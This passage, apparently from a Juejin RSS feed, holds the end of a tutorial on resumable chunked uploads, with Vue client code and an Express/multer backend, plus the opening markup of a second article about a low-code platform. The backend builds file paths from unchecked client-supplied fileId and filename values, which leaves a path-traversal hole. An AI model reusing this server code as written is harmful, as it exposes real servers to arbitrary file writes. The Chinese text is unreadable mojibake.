        <span class="hljs-title function_">processQueue</span>()
        fileData.<span class="hljs-title function_">onSuccess</span>({ <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span> })
        <span class="hljs-title function_">updateUploadProgress</span>(fileData.<span class="hljs-property">uid</span>, <span class="hljs-number">100</span>, <span class="hljs-string">'success'</span>)
        <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">success</span>(<span class="hljs-string">`<span class="hljs-subst">${fileName}</span> å·²ä¸Šä¼ ï¼ˆè·³è¿‡é‡å¤ä¸Šä¼ ï¼‰`</span>)
        <span class="hljs-keyword">return</span>
        
      } <span class="hljs-keyword">catch</span> (error) {
        <span class="hljs-comment">// åˆå¹¶å¤±è´¥ï¼Œå¯èƒ½æ–‡ä»¶å·²è¢«åˆ é™¤ï¼Œæ¸…ç†è®°å½•é‡æ–°ä¸Šä¼ </span>
        <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">removeItem</span>(progressKey)
        uploadedChunks = []  <span class="hljs-comment">// æ¸…ç©ºå·²ä¸Šä¼ è®°å½•ï¼Œé‡æ–°å¼€å§‹</span>
      }
    }
    
    <span class="hljs-comment">// é€ä¸ªä¸Šä¼ åˆ†å—</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; totalChunks; i++) {
      <span class="hljs-comment">// è·³è¿‡å·²ä¸Šä¼ çš„åˆ†å—</span>
      <span class="hljs-keyword">if</span> (uploadedChunks.<span class="hljs-title function_">includes</span>(i)) {
        <span class="hljs-keyword">const</span> progress = ((i + <span class="hljs-number">1</span>) / totalChunks) * <span class="hljs-number">100</span>
        <span class="hljs-title function_">updateUploadProgress</span>(fileData.<span class="hljs-property">uid</span>, progress, <span class="hljs-string">'uploading'</span>)
        <span class="hljs-keyword">continue</span>
      }
      
      <span class="hljs-comment">// åˆ‡å‰²åˆ†å—</span>
      <span class="hljs-keyword">const</span> start = i * <span class="hljs-variable constant_">CHUNK_SIZE</span>
      <span class="hljs-keyword">const</span> end = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(start + <span class="hljs-variable constant_">CHUNK_SIZE</span>, file.<span class="hljs-property">size</span>)
      <span class="hljs-keyword">const</span> chunk = file.<span class="hljs-title function_">slice</span>(start, end)
      
      <span class="hljs-comment">// å‡†å¤‡ä¸Šä¼ æ•°æ®</span>
      <span class="hljs-keyword">const</span> formData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FormData</span>()
      formData.<span class="hljs-title function_">append</span>(<span class="hljs-string">'chunk'</span>, chunk)
      formData.<span class="hljs-title function_">append</span>(<span class="hljs-string">'filename'</span>, fileName)  <span class="hljs-comment">// ä½¿ç”¨åŸå§‹æ–‡ä»¶å</span>
      formData.<span class="hljs-title function_">append</span>(<span class="hljs-string">'fileId'</span>, fileId)
      formData.<span class="hljs-title function_">append</span>(<span class="hljs-string">'chunkNumber'</span>, i)
      formData.<span class="hljs-title function_">append</span>(<span class="hljs-string">'totalChunks'</span>, totalChunks)
      
      <span class="hljs-comment">// ä¸Šä¼ åˆ†å—ï¼ˆé‡è¯•3æ¬¡ï¼‰</span>
      <span class="hljs-keyword">let</span> success = <span class="hljs-literal">false</span>
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> retry = <span class="hljs-number">0</span>; retry &lt; <span class="hljs-number">3</span> &amp;&amp; !success; retry++) {
        <span class="hljs-keyword">try</span> {
          <span class="hljs-keyword">await</span> request.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/upload-chunk'</span>, formData, {
            <span class="hljs-attr">headers</span>: { <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'multipart/form-data'</span> }
          })
          success = <span class="hljs-literal">true</span>
          <span class="hljs-comment">// è®°å½•åˆ° localStorageï¼ˆç”¨äºæ–­ç‚¹ç»­ä¼ ï¼‰</span>
          uploadedChunks.<span class="hljs-title function_">push</span>(i)
          <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(progressKey, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({ <span class="hljs-attr">chunks</span>: uploadedChunks }))
          
          <span class="hljs-comment">// æ›´æ–°è¿›åº¦æ¡</span>
          <span class="hljs-keyword">const</span> progress = ((i + <span class="hljs-number">1</span>) / totalChunks) * <span class="hljs-number">100</span>
          <span class="hljs-title function_">updateUploadProgress</span>(fileData.<span class="hljs-property">uid</span>, progress, <span class="hljs-string">'uploading'</span>)
          fileData.<span class="hljs-title function_">onProgress</span>({ <span class="hljs-attr">percent</span>: progress })
          
        } <span class="hljs-keyword">catch</span> (error) {
          <span class="hljs-keyword">if</span> (retry &lt; <span class="hljs-number">2</span>) {
            <span class="hljs-keyword">await</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> <span class="hljs-built_in">setTimeout</span>(resolve, <span class="hljs-number">1000</span>))
          } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`åˆ†å— <span class="hljs-subst">${i}</span> ä¸Šä¼ å¤±è´¥`</span>)
          }
        }
      }
    }
    
    <span class="hljs-comment">// ğŸ¯ æ‰€æœ‰åˆ†å—ä¸Šä¼ å®Œæˆåï¼Œç«‹å³æ¸…ç† localStorage</span>
    <span class="hljs-comment">// è¿™æ ·å¯ä»¥é¿å…ï¼šä¸Šä¼ å®Œæˆ â†’ åˆ·æ–°é¡µé¢ â†’ localStorageæ®‹ç•™ â†’ é‡å¤ä¸Šä¼ </span>
    <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">removeItem</span>(progressKey)
    
    <span class="hljs-comment">// åˆå¹¶æ–‡ä»¶</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[<span class="hljs-subst">${fileName}</span>] å¼€å§‹åˆå¹¶...`</span>)
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> mergeResult = <span class="hljs-keyword">await</span> request.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/merge-chunks'</span>, {
        <span class="hljs-attr">filename</span>: fileName,  <span class="hljs-comment">// ä½¿ç”¨åŸå§‹æ–‡ä»¶å</span>
        <span class="hljs-attr">fileId</span>: fileId,
        totalChunks
      })
      
      <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æ˜¯è·³è¿‡é‡å¤ä¸Šä¼ </span>
      <span class="hljs-keyword">if</span> (mergeResult.<span class="hljs-property">message</span> &amp;&amp; mergeResult.<span class="hljs-property">message</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'è·³è¿‡é‡å¤'</span>)) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[<span class="hljs-subst">${fileName}</span>] âš ï¸ åç«¯æ£€æµ‹åˆ°é‡å¤ä¸Šä¼ ï¼Œå·²è·³è¿‡`</span>)
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[<span class="hljs-subst">${fileName}</span>] âœ“ åˆå¹¶å®Œæˆ`</span>)
      }
      
      currentUploads--
      <span class="hljs-title function_">processQueue</span>()
      fileData.<span class="hljs-title function_">onSuccess</span>({ <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span> })
      <span class="hljs-title function_">updateUploadProgress</span>(fileData.<span class="hljs-property">uid</span>, <span class="hljs-number">100</span>, <span class="hljs-string">'success'</span>)
      <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">success</span>(<span class="hljs-string">`<span class="hljs-subst">${fileName}</span> ä¸Šä¼ æˆåŠŸ`</span>)
      
    } <span class="hljs-keyword">catch</span> (mergeError) {
      <span class="hljs-comment">// åˆå¹¶å¤±è´¥çš„ç‰¹æ®Šå¤„ç†</span>
      <span class="hljs-keyword">const</span> errorMsg = mergeError.<span class="hljs-property">message</span> || <span class="hljs-string">''</span>
      
      <span class="hljs-comment">// å¦‚æœæ˜¯"åˆ†å—ç›®å½•ä¸å­˜åœ¨"ï¼Œå¯èƒ½æ˜¯ä¸´æ—¶æ–‡ä»¶è¢«æ¸…ç†äº†</span>
      <span class="hljs-comment">// ä½†æ‰€æœ‰åˆ†å—å·²ä¸Šä¼ ï¼Œè§†ä¸ºæˆåŠŸï¼ˆå®¹é”™å¤„ç†ï¼‰</span>
      <span class="hljs-keyword">if</span> (errorMsg.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'åˆ†å—ç›®å½•ä¸å­˜åœ¨'</span>) || errorMsg.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'ä¸å­˜åœ¨'</span>)) {
        currentUploads--
        <span class="hljs-title function_">processQueue</span>()
        fileData.<span class="hljs-title function_">onSuccess</span>({ <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span> })
        <span class="hljs-title function_">updateUploadProgress</span>(fileData.<span class="hljs-property">uid</span>, <span class="hljs-number">100</span>, <span class="hljs-string">'success'</span>)
        <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">success</span>(<span class="hljs-string">`<span class="hljs-subst">${fileName}</span> ä¸Šä¼ æˆåŠŸ`</span>)
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// å…¶ä»–åˆå¹¶é”™è¯¯ï¼Œæ­£å¸¸æŠ›å‡º</span>
        <span class="hljs-keyword">throw</span> mergeError
      }
    }
    
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`[<span class="hljs-subst">${fileName}</span>] âœ— ä¸Šä¼ å¤±è´¥:`</span>, error.<span class="hljs-property">message</span>)
    currentUploads--
    <span class="hljs-title function_">processQueue</span>()
    fileData.<span class="hljs-title function_">onError</span>(error)
    <span class="hljs-title function_">updateUploadProgress</span>(fileData.<span class="hljs-property">uid</span>, <span class="hljs-number">0</span>, <span class="hljs-string">'error'</span>)
    <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`<span class="hljs-subst">${fileName}</span> ä¸Šä¼ å¤±è´¥`</span>)
  }
}
</code></pre>
<p>å…³é”®æŠ€æœ¯èŠ‚ç‚¹ï¼š</p>
<p>1ï¸âƒ£ åŒé‡éªŒè¯ï¼š<code>localstroage</code> æœ¬åœ°è®°å½• + åç«¯ <code>merge-chunks</code> æ¥å£éªŒè¯ï¼Œé˜²æ­¢"è„æ•°æ®"çš„äº§ç”Ÿã€‚</p>
<p>2ï¸âƒ£ æ–­ç‚¹ç»­ä¼ ï¼š<code>localStorage.setItem(progressKey, JSON.stringify({ chunks: uploadedChunks }))</code>,æ¯ä¸Šä¼ ä¸€ä¸ªåˆ†å—ä¿å­˜ç¼–å·ï¼Œç­‰ä¸‹æ¬¡æ–­ç‚¹ç»­ä¼ æ—¶æ–¹ä¾¿ç²¾å‡†å¯¹åº”ç¼–å·ï¼Œè·³è¿‡é‡å¤æ¨¡å—ä»¥èŠ‚çœèµ„æºã€‚</p>
<p>3ï¸âƒ£ å¤±è´¥é‡è¯•ï¼š<code>for</code>Â å¾ªç¯é‡è¯•3æ¬¡ï¼Œæé«˜ä¸Šä¼ æˆåŠŸç‡ã€‚</p>
<p>æœ€åï¼Œç»™ "å¼€å§‹ä¸Šä¼ " æŒ‰é’®ç»‘å®š <code>startUpload</code>ç‚¹å‡»äº‹ä»¶ï¼Œè§¦å‘ <code>&lt;el-upload&gt;</code> ä¸Šä¼ ç¨‹åºã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript">
<span class="hljs-keyword">const</span> <span class="hljs-title function_">startUpload</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">if</span> (uploadRef.<span class="hljs-property">value</span>) {
    uploadRef.<span class="hljs-property">value</span>.<span class="hljs-title function_">submit</span>()
  }
}
</code></pre>
<h2 data-id="heading-7">8.Node.jsåç«¯ä»£ç </h2>
<p>å—é™äºç¯‡å¹…è¿‡é•¿çš„åŸå› ï¼Œåç«¯ä»£ç ä¸å†åšè¯¦ç»†é˜è¿°ï¼Œä¸»è¦é€»è¾‘å·²åœ¨æºç ä¸­æ ‡è®°æ³¨é‡Šã€‚</p>
<p>ä¹Ÿå¯ç‚¹å‡»æŸ¥çœ‹ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Faosang%2Fnode_upload" target="_blank" title="https://github.com/aosang/node_upload" ref="nofollow noopener noreferrer">å‰åç«¯å®Œæ•´æºç </a></p>
<pre><code class="hljs language-Node.js" lang="Node.js">import express from 'express'
import cors from 'cors'
import path from 'path'
import fs from 'fs-extra'
import multer from 'multer'
import { fileURLToPath } from 'url'
import { dirname } from 'path'

const __filename = fileURLToPath(import.meta.url)
const __dirname = dirname(__filename)

const app = express()
app.use(cors())

const upload_dir = path.resolve(__dirname, 'uploads')
fs.ensureDirSync(upload_dir)

// é…ç½®é™æ€æ–‡ä»¶è®¿é—®ï¼Œä½¿ /uploads è·¯å¾„å¯ä»¥è®¿é—®åˆ° uploads æ–‡ä»¶å¤¹
app.use('/uploads', express.static(upload_dir))

// é…ç½® multer å­˜å‚¨
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, upload_dir)
  },
  filename: function (req, file, cb) {
    const ext = path.extname(file.originalname)
    const basename = path.basename(file.originalname, ext)
    cb(null, `${basename}-${Date.now()}${ext}`)
  }
})

const upload = multer({ storage: storage })

app.use(express.json())

// åˆ†å—ä¸Šä¼ ä¸´æ—¶ç›®å½•
const temp_dir = path.resolve(__dirname, 'temp_chunks')
fs.ensureDirSync(temp_dir)

// å·²å®Œæˆä¸Šä¼ çš„æ ‡è®°ç›®å½•ï¼ˆé¿å…é‡å¤ä¸Šä¼ ï¼‰
// æ³¨æ„ï¼šæ”¾åœ¨ temp_chunks å¤–éƒ¨ï¼Œé¿å…è¢«æ¸…ç†
const completed_dir = path.resolve(__dirname, 'upload_completed')
fs.ensureDirSync(completed_dir)
console.log(`å®Œæˆæ ‡è®°ç›®å½•: ${completed_dir}`)

// ä¸Šä¼ å•ä¸ªåˆ†å—ï¼ˆç®€åŒ–ç‰ˆï¼‰
app.post('/upload-chunk', upload.single('chunk'), (req, res) =&gt; {
  try {
    const { filename, fileId, chunkNumber, totalChunks } = req.body
    
    if (!req.file) {
      return res.status(400).json({
        success: false,
        message: 'æœªæ¥æ”¶åˆ°åˆ†å—æ–‡ä»¶'
      })
    }
    
    // ä½¿ç”¨ fileId åˆ›å»ºåˆ†å—ç›®å½•
    const chunkDir = path.resolve(temp_dir, fileId)
    fs.ensureDirSync(chunkDir)
    
    // ä¿å­˜åˆ†å—æ–‡ä»¶
    const chunkPath = path.resolve(chunkDir, `chunk-${chunkNumber}`)
    fs.moveSync(req.file.path, chunkPath, { overwrite: true })
    
    console.log(`å·²æ¥æ”¶: ${filename} åˆ†å— ${chunkNumber}/${totalChunks}`)
    
    res.json({
      success: true,
      message: `åˆ†å— ${chunkNumber} ä¸Šä¼ æˆåŠŸ`
    })
  } catch (error) {
    console.error(`åˆ†å—ä¸Šä¼ å¤±è´¥: ${error.message}`)
    res.status(500).json({
      success: false,
      message: 'åˆ†å—ä¸Šä¼ å¤±è´¥',
      error: error.message
    })
  }
})

// åˆå¹¶åˆ†å—ï¼ˆç®€åŒ–ç‰ˆï¼‰
app.post('/merge-chunks', async (req, res) =&gt; {
  try {
    const { filename, fileId, totalChunks } = req.body
    const chunkDir = path.resolve(temp_dir, fileId)
    const completedFlag = path.resolve(completed_dir, fileId)
    
    console.log(`å¼€å§‹åˆå¹¶: ${filename} (å…± ${totalChunks} å—)`)
    console.log(`åˆ†å—ç›®å½•: ${chunkDir}`)
    console.log(`å®Œæˆæ ‡è®°: ${completedFlag}`)
    
    // ğŸ¯ ä¼˜å…ˆæ£€æŸ¥ï¼šè¯¥æ–‡ä»¶æ˜¯å¦å·²ç»å®Œæˆè¿‡ï¼ˆé¿å…é‡å¤ä¸Šä¼ ï¼‰
    if (fs.existsSync(completedFlag)) {
      try {
        const savedFilename = await fs.readFile(completedFlag, 'utf-8')
        const actualFilePath = path.resolve(upload_dir, savedFilename)
        
        // ğŸ” å…³é”®æ£€æŸ¥ï¼šéªŒè¯å®é™…æ–‡ä»¶æ˜¯å¦çœŸå®å­˜åœ¨
        if (fs.existsSync(actualFilePath)) {
          console.log(`âœ“ æ–‡ä»¶ ${filename} å·²å­˜åœ¨ï¼Œè·³è¿‡é‡å¤ä¸Šä¼ `)
          console.log(`  å®é™…æ–‡ä»¶: ${savedFilename}`)
          return res.json({
            success: true,
            message: 'æ–‡ä»¶å·²ä¸Šä¼ ï¼ˆè·³è¿‡é‡å¤ï¼‰',
            filename: savedFilename
          })
        } else {
          // âš ï¸ æ ‡è®°æ–‡ä»¶å­˜åœ¨ï¼Œä½†å®é™…æ–‡ä»¶ä¸å­˜åœ¨ï¼ˆå¯èƒ½è¢«åˆ é™¤ï¼‰
          console.log(`âš ï¸ æ ‡è®°å­˜åœ¨ä½†æ–‡ä»¶ä¸å­˜åœ¨: ${savedFilename}`)
          console.log(`  åˆ é™¤æ— æ•ˆæ ‡è®°ï¼Œé‡æ–°ä¸Šä¼ `)
          await fs.remove(completedFlag)
          // ç»§ç»­æ‰§è¡Œåç»­çš„åˆå¹¶æµç¨‹
        }
      } catch (readError) {
        console.error(`è¯»å–å®Œæˆæ ‡è®°å¤±è´¥: ${readError.message}`)
        // å¦‚æœè¯»å–å¤±è´¥ï¼Œåˆ é™¤æŸåçš„æ ‡è®°æ–‡ä»¶ï¼Œç»§ç»­åˆå¹¶æµç¨‹
        await fs.remove(completedFlag)
      }
    }
    
    // æ£€æŸ¥åˆ†å—ç›®å½•æ˜¯å¦å­˜åœ¨
    if (!fs.existsSync(chunkDir)) {
      console.log(`âŒ åˆ†å—ç›®å½•ä¸å­˜åœ¨: ${fileId}`)
      return res.status(400).json({
        success: false,
        message: 'åˆ†å—ç›®å½•ä¸å­˜åœ¨ï¼Œè¯·é‡æ–°ä¸Šä¼ '
      })
    }
    
    // ç”Ÿæˆæœ€ç»ˆæ–‡ä»¶å
    const ext = path.extname(filename)
    const basename = path.basename(filename, ext)
    const finalFileName = `${basename}-${Date.now()}${ext}`
    const finalFilePath = path.resolve(upload_dir, finalFileName)
    
    // åˆ›å»ºå†™å…¥æµï¼ŒæŒ‰é¡ºåºåˆå¹¶åˆ†å—
    const writeStream = fs.createWriteStream(finalFilePath)
    
    for (let i = 0; i &lt; totalChunks; i++) {
      const chunkPath = path.resolve(chunkDir, `chunk-${i}`)
      
      // æ£€æŸ¥åˆ†å—æ˜¯å¦å­˜åœ¨
      if (!fs.existsSync(chunkPath)) {
        writeStream.close()
        return res.status(400).json({
          success: false,
          message: `åˆ†å— ${i} ä¸å­˜åœ¨ï¼Œè¯·é‡æ–°ä¸Šä¼ `
        })
      }
      
      // è¯»å–å¹¶å†™å…¥åˆ†å—
      const chunkBuffer = await fs.readFile(chunkPath)
      writeStream.write(chunkBuffer)
    }
    
    writeStream.end()
    
    // ç­‰å¾…å†™å…¥å®Œæˆ
    await new Promise((resolve, reject) =&gt; {
      writeStream.on('finish', resolve)
      writeStream.on('error', reject)
    })
    
    // åˆ é™¤ä¸´æ—¶åˆ†å—ç›®å½•
    await fs.remove(chunkDir)
    
    // ğŸ¯ åˆ›å»ºå®Œæˆæ ‡è®°ï¼ˆä¿å­˜æœ€ç»ˆæ–‡ä»¶åï¼Œé¿å…é‡å¤ä¸Šä¼ ï¼‰
    try {
      // ç¡®ä¿ .completed ç›®å½•å­˜åœ¨
      await fs.ensureDir(completed_dir)
      await fs.writeFile(completedFlag, finalFileName, 'utf-8')
      console.log(`âœ“ åˆ›å»ºå®Œæˆæ ‡è®°: ${fileId}`)
    } catch (flagError) {
      // æ ‡è®°åˆ›å»ºå¤±è´¥ä¸å½±å“ä¸»æµç¨‹ï¼Œä»…è®°å½•æ—¥å¿—
      console.error(`âš ï¸ åˆ›å»ºå®Œæˆæ ‡è®°å¤±è´¥: ${flagError.message}`)
    }
    
    console.log(`åˆå¹¶æˆåŠŸ: ${finalFileName}`)
    
    res.json({
      success: true,
      message: 'æ–‡ä»¶ä¸Šä¼ æˆåŠŸ',
      filename: finalFileName
    })
  } catch (error) {
    console.error(`æ–‡ä»¶åˆå¹¶å¤±è´¥: ${error.message}`)
    res.status(500).json({
      success: false,
      message: 'æ–‡ä»¶åˆå¹¶å¤±è´¥',
      error: error.message
    })
  }
})

// ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶æ¥å£ï¼ˆä¿ç•™åŸæœ‰æ¥å£ï¼‰
app.post('/upload', upload.single('file'), (req, res) =&gt; {
  if (!req.file) {
    return res.status(400).json({
      success: false,
      message: 'No file uploaded'
    })
  }
  res.json({
    success: true,
    message: 'File uploaded successfully',
    filePath: req.file.path,
    filename: req.file.filename
  })
})

app.listen(3000, () =&gt; {
  console.log('Server is running on port 3000')
})
</code></pre>
<p>å¦‚æœæˆ‘çš„æ–‡ç« èƒ½è®©æ‚¨æœ‰æ‰€æ”¶è·ï¼Œæ¬¢è¿ä¸€é”®ä¸‰è¿ï¼ˆè¯„è®ºï¼Œç‚¹èµï¼Œå…³æ³¨ï¼‰ï¼Œæ„Ÿè°¢ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[lecenï¼šä¸€ä¸ªæ›´å¥½çš„å¼€æºå¯è§†åŒ–ç³»ç»Ÿæ­å»ºé¡¹ç›®--ä»‹ç»ã€æ­å»ºã€è®¿é—®ä¸åŸºæœ¬é…ç½®--å…¨ä½ä»£ç |æ‰€è§å³æ‰€å¾—|åˆ©ç”¨å¯è§†åŒ–è®¾è®¡å™¨æ„å»ºä½ çš„åº”ç”¨ç³»ç»Ÿ-åšä¸€ä¸ªæ‡‚ä½ çš„äºº]]></title>    <link>https://juejin.cn/post/7588934987510054939</link>    <guid>https://juejin.cn/post/7588934987510054939</guid>    <pubDate>2025-12-29T08:32:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588934987510054939" data-draft-id="7588820422992347182" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="lecenï¼šä¸€ä¸ªæ›´å¥½çš„å¼€æºå¯è§†åŒ–ç³»ç»Ÿæ­å»ºé¡¹ç›®--ä»‹ç»ã€æ­å»ºã€è®¿é—®ä¸åŸºæœ¬é…ç½®--å…¨ä½ä»£ç |æ‰€è§å³æ‰€å¾—|åˆ©ç”¨å¯è§†åŒ–è®¾è®¡å™¨æ„å»ºä½ çš„åº”ç”¨ç³»ç»Ÿ-åšä¸€ä¸ªæ‡‚ä½ çš„äºº"/> <meta itemprop="keywords" content="ä½ä»£ç ,å‰ç«¯,åç«¯"/> <meta itemprop="datePublished" content="2025-12-29T08:32:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ™´è™¹"/> <meta itemprop="url" content="https://juejin.cn/user/976022057782280"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            lecenï¼šä¸€ä¸ªæ›´å¥½çš„å¼€æºå¯è§†åŒ–ç³»ç»Ÿæ­å»ºé¡¹ç›®--ä»‹ç»ã€æ­å»ºã€è®¿é—®ä¸åŸºæœ¬é…ç½®--å…¨ä½ä»£ç |æ‰€è§å³æ‰€å¾—|åˆ©ç”¨å¯è§†åŒ–è®¾è®¡å™¨æ„å»ºä½ çš„åº”ç”¨ç³»ç»Ÿ-åšä¸€ä¸ªæ‡‚ä½ çš„äºº
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/976022057782280/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ™´è™¹
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T08:32:25.000Z" title="Mon Dec 29 2025 08:32:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 